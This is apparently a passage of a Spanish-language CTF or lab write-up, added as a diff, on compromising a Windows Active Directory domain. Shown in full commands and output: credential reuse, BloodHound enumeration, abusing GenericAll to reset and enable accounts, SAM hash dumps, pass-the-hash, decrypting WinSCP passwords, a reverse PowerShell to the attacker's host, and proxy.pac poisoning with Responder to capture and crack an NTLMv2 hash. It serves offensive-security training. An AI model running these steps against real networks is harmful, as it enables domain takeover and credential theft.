@@ -814,5 +814,312 @@ press ENTER to exit
 "738847209304266833","Admin account - Mail","mail","http://mail.roundsoft.local/owa","","0","","ruby_adm","b3aut1fu1_lyk_@_g3m!","0","0","0","0","0","0","","738847209304266833","","","","0","0","","","0","0","","","0","","","1579534224","0","1579534224","1579534224","","0","0","",""
 "8006682195168702159","Flag","flag","http://sn","RPG{L3v31*******_b0$$_m0d3}","0","","","","0","0","1","0","0","0","","8006682195168702159","","","","0","0","","","1","","","","0","Generic","","","","","","","0","0","",""
 ```
+Las credenciales de "ruby_adm" que hemos obtenido son efectivas a nivel de dominio, lo que significa que poseen privilegios y acceso significativos dentro de la infraestructura del dominio. Para mapear y enumerar el dominio, utilizaremos BloodHound, autenticándonos como cualquier usuario del dominio. BloodHound es una herramienta especializada en la visualización y el análisis de relaciones de privilegios en redes de Windows. Esta herramienta nos permite identificar caminos de ataque potenciales y puntos débiles en la seguridad del dominio. Toda la información recopilada durante este proceso se almacenará en un archivo zip para su análisis posterior y para mantenerla segura y organizada.
 
+```bash
+❯ crackmapexec smb shinra.roundsoft.local -u ruby_adm -p b3aut1fu1_lyk_@_g3m!
+SMB         roundsoft.local 445    SHINRA           [*] Windows Server 2016 Standard 14393 x64 (name:SHINRA) (domain:Roundsoft.local) (signing:True) (SMBv1:True)  
+SMB         roundsoft.local 445    SHINRA           [+] Roundsoft.local\ruby_adm:b3aut1fu1_lyk_@_g3m!
+```
+
+```powershell
+❯ bloodhound-python -u ruby_adm -p b3aut1fu1_lyk_@_g3m! -ns 192.168.125.128 -d roundsoft.local -c All --zip  
+INFO: Found AD domain: roundsoft.local
+INFO: Getting TGT for user
+INFO: Connecting to LDAP server: Shinra.Roundsoft.local
+INFO: Found 1 domains
+INFO: Found 1 domains in the forest
+INFO: Found 3 computers
+INFO: Connecting to LDAP server: Shinra.Roundsoft.local
+INFO: Found 117 users
+INFO: Found 56 groups
+INFO: Found 3 gpos
+INFO: Found 2 ous
+INFO: Found 19 containers
+INFO: Found 0 trusts
+INFO: Starting computer enumeration with 10 workers
+INFO: Querying computer: GELUS.Roundsoft.local
+INFO: Querying computer: Lux.Roundsoft.local
+INFO: Querying computer: Shinra.Roundsoft.local
+INFO: Done in 00M 39S
+INFO: Compressing output into 20230825230949_bloodhound.zip
+```
+
+![Photo2](/assets/images/RPG1.png)
+
+Al cargar el zip, descubrimos que 'ruby_adm' posee privilegios GenericAll sobre 100 usuarios del dominio, pero la mayoría no son útiles para nuestros propósitos.
+
+Podemos comenzar nuestra búsqueda enfocándonos en los usuarios que pertenecen al grupo "Developers", ya que estos usuarios tienen privilegios de administrador local en el equipo LUX. Esto nos proporcionará una vía potencial para obtener acceso y avanzar en nuestra investigación.
+
+```powershell
+PS C:\Users\janderson\Documents> net localgroup Administrators
+
+Alias name     Administrators
+Comment        Administrators have complete and unrestricted access to the computer/domain  
+
+Members
+
+-------------------------------------------------------------------------------
+Administrator
+ROUNDSOFT\Developers
+ROUNDSOFT\Domain Admins
+Roundsoft_HR
+
+The command completed successfully.
+```
+
+Hemos identificado que tenemos privilegios GenericAll sobre 2 usuarios que son miembros del grupo Developers. Esto nos brinda una oportunidad para avanzar en nuestra exploración, ya que estos usuarios pueden tener acceso significativo y podrían servir como puntos de entrada para nuestro objetivo.
+
+![Photo1](/assets/images/RPG2.png)
+
+El plan es sencillo: cambiar la contraseña de un usuario, en este caso lthomson, y autenticarnos con él. Sin embargo, al intentarlo, recibimos un mensaje indicando que el usuario está deshabilitado. Esto presenta un obstáculo en nuestro plan, ya que no podemos proceder con la autenticación utilizando esta cuenta.
+
+```bash
+❯ net rpc password lthomson password123# -U 'roundsoft.local/ruby_adm%b3aut1fu1_lyk_@_g3m!' -S shinra.roundsoft.local
+
+❯ crackmapexec smb shinra.roundsoft.local -u lthomson -p password123#
+SMB         roundsoft.local 445    SHINRA           [*] Windows Server 2016 Standard 14393 x64 (name:SHINRA) (domain:Roundsoft.local) (signing:True) (SMBv1:True)  
+SMB         roundsoft.local 445    SHINRA           [-] Roundsoft.local\lthomson:password123# STATUS_ACCOUNT_DISABLED
+```
+
+Al tener `GenericAll` sobre estos también podemos habilitarlos, subimos PowerView a una maquina y con la credencial de `ruby_adm` habilitamos al usuario `lthomson`
+
+```powershell
+PS C:\Users\rrodriguez\Documents> Import-Module .\PowerView.ps1
+PS C:\Users\rrodriguez\Documents> $SecPassword = ConvertTo-SecureString 'b3aut1fu1_lyk_@_g3m!' -AsPlainText -Force
+PS C:\Users\rrodriguez\Documents> $Cred = New-Object System.Management.Automation.PSCredential('roundsoft.local\ruby_adm', $SecPassword)  
+PS C:\Users\rrodriguez\Documents> Set-DomainObject -Identity LThomson -XOR @{useraccountcontrol=2} -Cred $Cred
+PS C:\Users\rrodriguez\Documents>
+```
+
+Si intentamos ahora autenticarnos utilizando las credenciales contra el Controlador de Dominio (DC), recibimos la confirmación de que son válidas. Esto sugiere que las credenciales son correctas y que tenemos acceso al sistema utilizando la cuenta asociada.
+
+```bash
+❯ crackmapexec smb shinra.roundsoft.local -u lthomson -p password123#
+SMB         roundsoft.local 445    SHINRA           [*] Windows Server 2016 Standard 14393 x64 (name:SHINRA) (domain:Roundsoft.local) (signing:True) (SMBv1:True)  
+SMB         roundsoft.local 445    SHINRA           [+] Roundsoft.local\lthomson:password123#
+```
+
+Una vez que hemos activado con éxito el usuario y nos autenticamos contra LUX, donde tenemos privilegios de administrador, recibimos un mensaje de "Pwn3d!", indicando que hemos obtenido un control efectivo sobre el sistema. Esto nos permite proceder a realizar el volcado de la SAM y así poder visualizar los hashes NT, lo que representa un paso significativo hacia el logro de nuestros objetivos.
+
+```bash
+❯ crackmapexec smb lux.roundsoft.local -u lthomson -p password123# 
+SMB         lux.roundsoft.local 445    LUX              [*] Windows 10.0 Build 18362 x64 (name:LUX) (domain:Roundsoft.local) (signing:False) (SMBv1:False)
+SMB         lux.roundsoft.local 445    LUX              [+] Roundsoft.local\lthomson:password123# (Pwn3d!)  
+
+❯ crackmapexec smb lux.roundsoft.local -u lthomson -p password123# --sam
+SMB         lux.roundsoft.local 445    LUX              [*] Windows 10.0 Build 18362 x64 (name:LUX) (domain:Roundsoft.local) (signing:False) (SMBv1:False)  
+SMB         lux.roundsoft.local 445    LUX              [+] Roundsoft.local\lthomson:password123# (Pwn3d!)
+SMB         lux.roundsoft.local 445    LUX              [*] Dumping SAM hashes
+SMB         lux.roundsoft.local 445    LUX              Administrator:500:aad3b435b51404eeaad3b435b51404ee:53ff2611f458c331e1ecbb3921b7b471:::
+SMB         lux.roundsoft.local 445    LUX              Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+SMB         lux.roundsoft.local 445    LUX              DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+SMB         lux.roundsoft.local 445    LUX              WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:e1c935bfda72ce05c46592bcbaea4ad3:::
+SMB         lux.roundsoft.local 445    LUX              Roundsoft_HR:1001:aad3b435b51404eeaad3b435b51404ee:e5562111cec252d79c2205f7ede6beba:::
+```
+  
+Podemos conectar con el hash de Administrator utilizando Evil-WinRM.
+
+```powershell
+❯ evil-winrm -i lux.roundsoft.local -u Administrator -H 53ff2611f458c331e1ecbb3921b7b471  
+PS C:\Users\Administrator\Documents> whoami
+lux\administrator
+```
+
+Vamos a iniciar descargando el archivo NTUSER.DAT del usuario yamano, ya que es probable que haya almacenado sus credenciales en los registros al usar WinSCP en su versión de escritorio. Esto nos permitirá analizar el archivo en busca de información relevante.
+
+```powershell
+PS C:\Users\yamano> download NTUSER.DAT NTUSER.DAT
+
+Info: Downloading C:\Users\yamano\NTUSER.DAT to NTUSER.DAT
+
+Info: Download successful!
+
+PS C:\Users\yamano>
+```
+
+Utilizando Registry Explorer, podemos explorar la sesión de WinSCP y encontrar las credenciales almacenadas. Posteriormente, utilizando winscppasswd, podemos descifrar la contraseña basándonos en los datos obtenidos del registro de WinSCP, lo que nos proporciona la contraseña en texto plano.
+
+```powershell
+PS C:\Users\pc1\Desktop> .\winscppasswd.exe 192.168.125.135 yamano A35C7059DC0FAE8584253D313D32336D656E726D6A64726D6E69726D6F691D2E6B03350F033A1C32281C2F286D3F033E6F3D292825  
+Ar7_iS_f@nt@st1c_b3auty
+PS C:\Users\pc1\Desktop>
+```
+
+La credencial es válida; sin embargo, parece que este usuario no puede conectarse a través del protocolo WinRM a ninguno de los equipos que aún quedan por comprometer. Esto representa un obstáculo en nuestro avance, ya que no podemos utilizar esta cuenta para acceder a los sistemas restantes de manera remota mediante WinRM.
+
+```bash
+❯ crackmapexec smb shinra.roundsoft.local -u yamano -p Ar7_iS_f@nt@st1c_b3auty
+SMB         roundsoft.local 445    SHINRA           [*] Windows Server 2016 Standard 14393 x64 (name:SHINRA) (domain:Roundsoft.local) (signing:True) (SMBv1:True)  
+SMB         roundsoft.local 445    SHINRA           [+] Roundsoft.local\yamano:Ar7_iS_f@nt@st1c_b3auty
+
+❯ crackmapexec winrm 192.168.125.88-128 -u yamano -p Ar7_iS_f@nt@st1c_b3auty
+SMB         192.168.125.88  5985   GELUS            [*] Windows 10.0 Build 17763 (name:GELUS) (domain:Roundsoft.local)
+SMB         192.168.125.128 5985   SHINRA           [*] Windows 10.0 Build 14393 (name:SHINRA) (domain:Roundsoft.local)
+HTTP        192.168.125.88  5985   GELUS            [*] http://192.168.125.88:5985/wsman
+HTTP        192.168.125.128 5985   SHINRA           [*] http://192.168.125.128:5985/wsman
+HTTP        192.168.125.88  5985   GELUS            [-] Roundsoft.local\yamano:Ar7_iS_f@nt@st1c_b3auty 
+HTTP        192.168.125.128 5985   SHINRA           [-] Roundsoft.local\yamano:Ar7_iS_f@nt@st1c_b3auty
+```
+
+A pesar de las limitaciones con WinRM, hemos logrado ejecutar comandos localmente en el equipo GELUS utilizando Invoke-RunasCs, utilizando las credenciales del usuario. Por ejemplo, ejecutamos un simple comando "whoami" para probar la funcionalidad. Además, aprovechando la conexión directa que tenemos con nuestro equipo desde este punto, utilizamos el parámetro "-Remote" de RunasCs para enviar una instancia de PowerShell, lo que nos brinda una mayor flexibilidad y control sobre el sistema remoto.
+
+```powershell
+PS C:\Users\rrodriguez\Documents> curl 10.10.14.10/Invoke-RunasCs.ps1 -o Invoke-RunasCs.ps1  
+PS C:\Users\rrodriguez\Documents> Import-Module .\Invoke-RunasCs.ps1
+PS C:\Users\rrodriguez\Documents> Invoke-RunasCs yamano Ar7_iS_f@nt@st1c_b3auty whoami
+roundsoft\yamano
+PS C:\Users\rrodriguez\Documents> Invoke-RunasCs yamano Ar7_iS_f@nt@st1c_b3auty powershell -Remote 10.10.14.10:443
+[+] Running in session 0 with process function CreateProcessWithTokenW()
+[+] Using Station\Desktop: Service-0x0-27fbfef$\Default
+[+] Async process 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe' with pid 7192 created in background.  
+PS C:\Users\rrodriguez\Documents>
+```
+
+```bash
+❯ sudo netcat -lvnp 443
+Listening on 0.0.0.0 443
+Connection received on 10.13.38.19
+Windows PowerShell 
+Copyright (C) Microsoft Corporation. All rights reserved.  
+
+PS C:\Windows\system32> whoami
+roundsoft\yamano
+PS C:\Windows\system32> hostname
+GELUS
+PS C:\Windows\system32>
+```
+
+Al explorar el directorio "inetpub", hemos descubierto un archivo llamado "proxy.pac", el cual contiene información sobre cómo redirigir el tráfico a través de un proxy mediante un script en JavaScript. Es importante destacar que este archivo puede ser modificado por el grupo Infra, al cual pertenecen tanto el usuario yamano como el que estamos utilizando actualmente. Por lo tanto, tenemos la capacidad de escribir en este archivo y modificar su funcionalidad según sea necesario.
+
+```powershell
+PS C:\inetpub\altroot\pac_testing> dir
+
+    Directory: C:\inetpub\altroot\pac_testing
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-a----        5/22/2020  12:02 AM            118 proxy.pac            
+
+PS C:\inetpub\altroot\pac_testing> type proxy.pac
+function FindProxyForURL(url, host) 
+{
+	// allow DIRECT for now, yamano to setup proxy server 
+	return "DIRECT";
+}
+PS C:\inetpub\altroot\pac_testing> icacls proxy.pac
+proxy.pac ROUNDSOFT\Infra:(W)
+          ROUNDSOFT\Infra:(I)(RX)
+          BUILTIN\IIS_IUSRS:(I)(RX)
+          NT AUTHORITY\IUSR:(I)(RX)
+          BUILTIN\Administrators:(I)(F)
+          NT AUTHORITY\SYSTEM:(I)(F)
+          NT SERVICE\TrustedInstaller:(I)(F)
+
+Successfully processed 1 files; Failed processing 0 files
+PS C:\inetpub\altroot\pac_testing> Get-ADPrincipalGroupMembership yamano | Select Name  
+
+Name
+----
+Domain Users
+Developers
+Infra
+
+PS C:\inetpub\altroot\pac_testing>
+```
+
+Al responder, asegúrate de incluir el parámetro "-P" seguido del puerto del proxy, que en este caso es el puerto 3128. Esto garantizará que la conexión se enrutará a través del proxy correcto cuando se realicen las modificaciones necesarias en el archivo "proxy.pac".
+
+```shell
+❯ sudo responder -I tun0 -P
+                                         __
+  .----.-----.-----.-----.-----.-----.--|  |.-----.----. 
+  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _| 
+  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
+                   |__|
+
+           NBT-NS, LLMNR & MDNS Responder 3.1.3.0
+
+[+] Listening for events...
+```
+
+Hemos modificado el archivo proxy.pac para que utilice nuestro host como proxy en el puerto 3128, donde está escuchando nuestra solicitud de autenticación. Después de esperar unos minutos, hemos recibido un hash NTLMv2 del usuario AThompson. Este hash nos proporciona una forma de autenticarnos como el usuario AThompson y avanzar en nuestra investigación.
+
+```powershell
+PS C:\inetpub\altroot\pac_testing> echo 'function FindProxyForURL(url, host){ return "PROXY 10.10.14.10:3128; DIRECT"; }' > proxy.pac  
+PS C:\inetpub\altroot\pac_testing> type proxy.pac
+function FindProxyForURL(url, host){ return "PROXY 10.10.14.10:3128; DIRECT"; }
+PS C:\inetpub\altroot\pac_testing>
+```
+
+```bash
+❯ sudo responder -I tun0 -P
+                                         __
+  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
+  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
+  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
+                   |__|
+
+           NBT-NS, LLMNR & MDNS Responder 3.1.3.0
+
+[+] Listening for events...
+
+[Proxy-Auth] NTLMv2 Client   : 10.13.38.19
+[Proxy-Auth] NTLMv2 Username : ROUNDSOFT\AThompson
+[Proxy-Auth] NTLMv2 Hash     : ATHOMPSON::ROUNDSOFT:1122334455667788:3226D5ADD8CEC459E58BCB2A944E4416:0101000000000000003525685CD8D901466A01CE2E0CBE4400000000020008004F0053005A00430001001E00570049004E002D00330055003800590030004E004600590033004C00350004003400570049004E002D00330055003800590030004E004600590033004C0035002E004F0053005A0043002E004C004F00430041004C00030014004F0053005A0043002E004C004F00430041004C00050014004F0053005A0043002E004C004F00430041004C0007000800003525685CD8D90106000400020000000800300030000000000000000000000000300000A0E6542D491037E632B42B69C0AC5B75A6B6336276CAB6008B4C1EB3B07788A10A0010000000000000000000000000000000000009001E0063006900660073002F00310030002E00310030002E00310034002E0032000000000000000000  
+```
+
+Inicialmente, el intento de romper el hash utilizando el archivo "rockyou.txt" con John no tuvo éxito. Sin embargo, después de aplicar algunas reglas adicionales, hemos logrado obtener la contraseña para el usuario AThompson. Resulta interesante destacar que el usuario AThomson es un administrador local en el equipo GELUS. Esto nos brinda un acceso significativo dentro del sistema y nos permite avanzar hacia nuestros objetivos con mayor autoridad y control.
+
+```bash
+❯ john -w:/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt hash --rules:d3ad0ne
+Using default input encoding: UTF-8
+Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
+Press 'q' or Ctrl-C to abort, almost any other key for status
+sshhiinnoobbii!! (ATHOMPSON)
+Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably  
+Session completed.
+```
+
+```powershell
+PS C:\Users\yamano\Documents> net localgroup Administrators
+Alias name     Administrators
+Comment        Administrators have complete and unrestricted access to the computer/domain  
+
+Members
+
+-------------------------------------------------------------------------------
+Administrator
+ROUNDSOFT\AThompson
+ROUNDSOFT\Domain Admins
+
+The command completed successfully.
+
+PS C:\Users\yamano\Documents>
+```
+
+Dado que somos administradores locales en el equipo GELUS, al autenticarnos en este equipo recibimos un mensaje de "Pwn3d!", lo que nos permite realizar el volcado de la SAM y visualizar todos los hashes NT. Con esta información, simplemente podemos conectarnos al usuario Administrator utilizando el hash NT mediante un passthehash con Evil-WinRM. Una vez autenticados, finalmente podemos leer la flag que se encuentra en el escritorio del usuario Administrator. Este enfoque nos permite completar nuestros objetivos de manera efectiva y obtener acceso a la información deseada.
+
+```bash
+❯ crackmapexec smb gelus.roundsoft.local -u athompson -p 'sshhiinnoobbii!!'
+SMB         gelus.roundsoft.local 445    GELUS            [*] Windows 10.0 Build 17763 x64 (name:GELUS) (domain:Roundsoft.local) (signing:False) (SMBv1:False)  
+SMB         gelus.roundsoft.local 445    GELUS            [+] Roundsoft.local\athompson:sshhiinnoobbii!! (Pwn3d!)
+
+❯ crackmapexec smb gelus.roundsoft.local -u athompson -p 'sshhiinnoobbii!!' --sam
+SMB         gelus.roundsoft.local 445    GELUS            [*] Windows 10.0 Build 17763 x64 (name:GELUS) (domain:Roundsoft.local) (signing:False) (SMBv1:False)  
+SMB         gelus.roundsoft.local 445    GELUS            [+] Roundsoft.local\athompson:sshhiinnoobbii!! (Pwn3d!)
+SMB         gelus.roundsoft.local 445    GELUS            [*] Dumping SAM hashes
+SMB         gelus.roundsoft.local 445    GELUS            Administrator:500:aad3b435b51404eeaad3b435b51404ee:e3e6f84b9fbe9eef55078e76115b3a9c:::
+SMB         gelus.roundsoft.local 445    GELUS            Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+SMB         gelus.roundsoft.local 445    GELUS            DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+SMB         gelus.roundsoft.local 445    GELUS            WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:b89195ed259b08446b62a25dc930530b:::
+```
+
+```powershell
+❯ evil-winrm -i gelus.roundsoft.local -u Administrator -H e3e6f84b9fbe9eef55078e76115b3a9c  
+PS C:\Users\Administrator\Documents> whoami
+gelus\administrator
+PS C:\Users\Administrator\Documents> type ..\Desktop\flag.txt
+RPG{l3ave_my_hash3s_al0ne!}
+```
 
